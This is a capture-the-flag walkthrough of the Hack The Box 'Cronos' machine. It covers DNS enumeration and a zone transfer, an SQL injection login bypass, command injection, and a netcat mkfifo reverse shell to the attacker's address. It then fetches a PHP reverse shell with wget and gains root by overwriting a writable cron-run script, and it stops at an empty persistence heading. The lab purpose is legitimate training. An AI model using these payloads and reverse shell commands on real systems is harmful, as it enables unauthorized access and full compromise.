# hacking cronos - htb

CronOS is a fun linux box on [htb](https://www.hackthebox.com/) which lets us practice enumeration on a linux machine and learn more about exploiting misconfigured scheduled tasks :hourglass_flowing_sand: - aka cronjobs.

## port scanning

As usual, we start with an nmap scan of the target machine.

```bash
ports13=$(sudo nmap -n -Pn -p- --min-rate=250 -sS --open 10.10.10.13 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

echo $ports13 > p13.txt

cat p13.txt
```

We find that ports 22, 53 and 80 are open.

![nmap1](./images/1.png)

Seeing port 53 over tcp is interesting since port 53 over udp is used to make dns inquiries and udp is the normal protocol used for dns.

dns uses tcp port 53 for zone transfers and it is always useful to enumerate dns to widen attack surfaces - for example find subdomains to attack.

> [!TIP]
> Seeing DNS using TCP port 53 suggests that we might be able to perform a zone transfer

We use nmap to perform a more thorough scan of the open tcp ports.

```bash
sudo nmap -Pn -p$ports13 -sV -A -oA ports13 10.10.10.13
```

![nmap2](./images/2.png)

We could just jump right in and attempt a zone transfer, but we can try to manually enumerate dns first. Our intention is to manually find subdomains.

## manual dns enumeration

I started by trying a *reverse dns lookup* using the dig tool. When it comes to dns records, some will have a *PTR* record which is where the *reverse dns request* looks.

The PTR record just maps an ipv4 address to a domain name so we can find the domain name by specifying the ipv4 address. This is the opposite of how dns requests are usually made - usually a domain is specified and the ipv4 address is returned from the A record.

In the following command, the @ symbol lets us specify the ip address of the dns server we want to use - in this case it is the targetted machine itself. The -x flag indicates that we want to run a *reverse* lookup for the specified ip address.

```bash
sudo dig @10.10.10.13 -x 10.10.10.13 +nocookie
```

![dns1](./images/3.png)

The next step was to brute-force possible subdomains using a shell script. We can do this as in this example - whereby we use strings and try them as subdomain names - or we can do it using ip addresses along with reverse lookups. I did not try this technique on this box as I got an interesting result using the first method.

```bash
for name in $(cat /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt); do host $name.cronos.htb 10.10.10.13 -W 2; done | grep 'has address'
```

![dns2](./images/4.png)

As can be seen, we find a subdomain called *admin* which immediately gets our attention!

I was impatient to have a look at the admin subdomain - for obvious reasons - so I terminated the script early and tried a zone transfer to see if it would be possible and if so if I had missed anything.

We find that we can perform a zone transfer, but we find nothing new - our manual enumeration found all that it needed to.

```bash
sudo dig @10.10.10.13 -t AXFR cronos.htb +nocookie
```

> [!NOTE]
> In the picture my first command forgot to specify the DNS server - the above command (should!) work

![dns3](./images/5.png)

Okay - it's time to have a look at that admin subdomain :smiley:

## authentication bypass

![sqli1](./images/6.png)

Seeing a login form, I immediately thought about trying a sqli to bypass authentication. Before trying this, I did try a few generic credentials such as *admin:admin*

> [!TIP]
> It is always worth trying generic credentials or researching default ones for the target service

The generic creds did not work, so I fired up burpsuite to start testing the form for sqli vulnerabilities.

I started by trying a simple authentication bypass on the password field - this did not work so I tried again but on the username field - this was successful.

> [!IMPORTANT]
> Test *every* input field for sqli and xss vulns

`username=admin'+or+1=1+--+-`

The sqli attack works and we then just need to follow the redirection to land at a welcome.php page.

![sqli2](./images/7.png)

![sqli3](./images/8.png)

The welcome.php page is interesting, too :thinking:

## command injection and a reverse shell

The welcome page shows a tool which appears to execute commands on the system - *command injection* seems a very likely next step.

Using the *repeater* tool in burpsuite we find that when we add `;` after the *host* parameter we can follow it with system commands which get executed :smile:

`host=8.8.8.8;whoami`

![ci1](./images/9.png)

This is a simple *command injection* vulnerability and we can now try to find a way to exploit it - getting a reverse shell to work would be nice :thumbsup:

I found a netcat reverse shell worked.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f
```

I used this command in the repeater tool and *url encoded* it by highlighting it and then pressing `CTRL + U` before sending it.

> [!NOTE]
> Remember to start a netcat listener on your attacking machine before you send the above command `sudo nc -nlvp 4444` :roll_eyes:

![ci2](./images/10.png)

The shell we get is (unsurprisingly) running under the *www-data* user which has low privileges.

![ci3](./images/11.png)

Before continuing, it makes sense to upgrade our shell. There are different ways to do this, but if *python* is installed on the victim system then we can use it to upgrade.

```bash
python --version

python -c 'import pty;pty.spawn("/bin/bash");'
```

Now we have a (slightly) more stable shell, it is time to get enumerating the box :detective: so we can find ways to elevate our privileges :arrow_up:

## initial enumeration and grabbing the user flag

We start our enumeration by looking for other users on the system - this is always a good idea. We are looking for regular users rather than service users so we can us `cat /etc/passwd | grep -v /nologin` to filter out users who have `/nologin` specified as their shells. We find one other regular user called *noulis* on the victim machine.

![enum1](./images/15.png)

When we take a look :eyes: at the home directory for *noulis* we (oddly) find that we can access it *and* read the user flag file with `cat user.txt` because other users (including us!) have *read* access to it.

![enum2](./images/16.png)

Well, that was nice :cake: 

With that out of the way, we can turn our attention to elevating our privileges. There are endless ways to do this, but the name of the box (strongly) hints at a cron job being involved...

## enumerating cron jobs

First up, what is cron and why is it important for us as ~~hackers~~ penetration testers?

> [!NOTE]
> If you want to delve deeper into cron please check out [scheduling tasks on linux](https://github.com/zigzaga00/linux-notes/blob/main/linux-notes.md#automating-and-scheduling-tasks-using-cron-jobs)

Simply put, cron lets us schedule repetitive tasks on linux systems. It is important to bear in mind that we can set up *user specific* cron jobs and *system wide* cron jobs.

As ~~penetration testers~~ hackers looking for a way to elevate our privileges, we are interested in cron jobs which are running as the root user or other interesting users.

One place we can look for these is in the `/etc/crontab` file - we can simply use `cat /etc/crontab` to look at its contents.

This crontab is used to keep track of *system wide* cron jobs rather than *user specific* ones. We might find cron jobs running as more interesting users in this crontab and we might even find (as in this case) cron jobs set to run as root :smiley:

![cron1](./images/17.png)

The format of `etc/crontab` might seem confusing at first, but it is quite simple. Hopefully, the following table will aid understanding.

|minute|hour|day|month|day of the week|user|command|
|---|---|---|---|---|---|---|
|*|*|*|*|*|root|command goes here|

The `*` is a wildcard which specifies all. The minute is the minute past an hour, the hour is the hour of the day, the day is the date of the month, the month is the month of the year, the day of the week is a filter and is used to numerically specify a day of the week with 0 or 7 specifying Sunday, the user is the user the task will run as and the command can either be put directly into the crontab or it can reference a binary or shell script - phew :hot_face:

In the case on this box, php is running a php script which can be found at `/var/www/laravel/artisan` every minute as the root user.

Why should we care? :confused:

Because it is running a php script as the *root* user. What if we have *write* access to the php script it is running? :thinking:

## exploiting misconfigured permissions and a cron job

When we check the permissions for `/var/www/laravel/artisan` we find that the `www-data` user has *write* access to it :facepalm: This means that we can now replace it with a malicious php script or append malicious php code to it.

![cron2](./images/18.png)

We can edit a php reverse shell on our attacking machine and then transfer it to the victim machine.

![cron3](./images/20.png)

To transfer the edited php reverse shell to the victim machine we can start a simple python http server on our attacking machine in the same directory as the php reverse shell and then get it using wget on the victim machine.

```bash
sudo python3 -m http.server 80

wget http://10.10.14.15/rs.php
```

We now need to give the php reverse shell executable permissions using `chmod +x rs.php`

![cron4](./images/21.png)

If we care :angel: about restoring the system to how it was before we messed with it, now would be a good time to rename the original `/var/www/laravel/artisan` script to be something like `/var/www/laravel/artisan.bak` since we are just about to replace it with our malicious php script using `mv ./rs.php /var/www/laravel/artisan` :vampire:

We now just need to open a new netcat listener on our attacking machine using the same port as we specified in the php reverse shell - in this case that is 4445 `sudo nc -nlvp 4445`

We will (hopefully) soon get a reverse shell as root because the cron job we saw in `/etc/crontab` will execute the (now malicious) `/var/www/laravel/artisan` php script as the root user - this in turn will call back to our netcat listener on our attacking machine :thumbsup:

![pwned](./images/23.png)

At this point, the box has been pwned :skull: but we can continue our fun by looking at how we can use cron jobs to establish *persistance* on a compromised machine and a tool we can use to help us find *user specific* cron jobs - this can sometimes be necessary since the root user might have scheduled an exploitable cron job in a *user specific* way which will not show in `/etc/crontab`

## persistant access via a cron job

